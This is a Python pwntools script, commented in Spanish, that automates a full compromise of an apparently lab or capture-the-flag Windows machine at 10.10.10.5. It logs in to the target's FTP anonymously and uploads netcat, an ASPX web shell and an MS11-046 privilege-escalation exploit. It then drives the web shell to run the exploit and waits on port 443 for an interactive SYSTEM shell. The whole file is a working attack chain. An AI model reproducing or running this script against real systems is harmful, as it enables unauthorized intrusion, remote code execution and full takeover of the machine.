from pwn import *
from ftplib import FTP
import requests, re, signal, sys, threading, socket, os

# Ctrl + C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)
    
signal.signal(signal.SIGINT, def_handler)

rhost = '10.10.10.5' # IP de la maquina victima
lhost = '10.10.16.7' # IP del atacante
lport = 443 # Puerto en el que estamos escuchando

# Archivos que subiremos al FTP de la victima
malicious_files = ("nc.exe", "shell.aspx", "ms11-046.exe")

# URL de la web shell maliciosa
console_url = f"http://{rhost}/shell.aspx"

def checkConnection():
    log.info(f"Comprobante conexion con {rhost} al puerto 21...")
    time.sleep(1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((rhost,21))
        s.close()
        log.success("Conexion exitosa con el servidor FTP")
    except:
        log.error("No se pudo realizar la conexion a FTP")
        sys.exit(1)
    

# Nos logeamos y subimos los archivos
def uploadFiles():
    
    ftp = FTP(rhost)
    ftp.login()
    log.success("Subiendo archivos")
    
    for malicious_file in malicious_files:
        if not os.path.isfile(malicious_file):
            log.error(f"Archivo no encontrado {malicious_file}")
            sys.exit(1)
        else:
            ftp.storbinary("STOR %s" %malicious_file, open(malicious_file, "rb"))

    
# Ejecucion remota del exploit ms11-046 para obtener shell como SYSTEM
def makeRequest():
    
    s = requests.session()
    r = s.get(console_url)
    
    if r.status_code != 200:
        print(f"Error en la peticion HTTP {r.status_code}")
        sys.exit(1)
    else:
        log.success("Ejecutando exploit")
        try:
            post_data = {
                '__VIEWSTATE': re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0],
                '__EVENTVALIDATION': re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0],
                'txtArg': rf'C:\inetpub\wwwroot\ms11-046.exe',
                'testing': 'excute'
            }
            time.sleep(1)
            r = s.post(console_url, data=post_data)
        except IndexError:
            log.error("Hubo un error con el campo VIEWSTATE o EVENTVALIDATION")
            sys.exit(1)


if __name__ == '__main__':
    
    checkConnection()
    
    uploadFiles()
    time.sleep(1)
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    log.success(f"En escucha por el puerto {lport}")
    
    # Nos ponemos en escucha y recibimos la shell como SYSTEM
    context.log_level = 'error'
    shell = listen(lport, timeout=10).wait_for_connection()
    context.log_level = 'info'
    
    log.success("Obteniendo shell interactiva como SYSTEM")
    time.sleep(1)
    context.log_level = 'error'
    shell.interactive()
    context.log_level = 'info'
